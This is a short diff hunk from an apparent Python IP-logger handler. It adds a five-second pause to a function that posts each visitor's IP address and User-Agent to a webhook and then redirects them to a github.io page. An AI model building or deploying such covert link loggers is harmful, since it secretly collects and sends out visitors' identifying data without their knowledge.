@@ -14,6 +14,7 @@ def log_ip():
         "content": f"IP: {ip}\nUser-Agent: {user_agent}"
     }
     requests.post(WEBHOOK_URL, json=data)
+    time.sleep(5)
     return redirect("https://gengaog.github.io/-/")  # oder return "OK"
 
 if __name__ == "__main__":
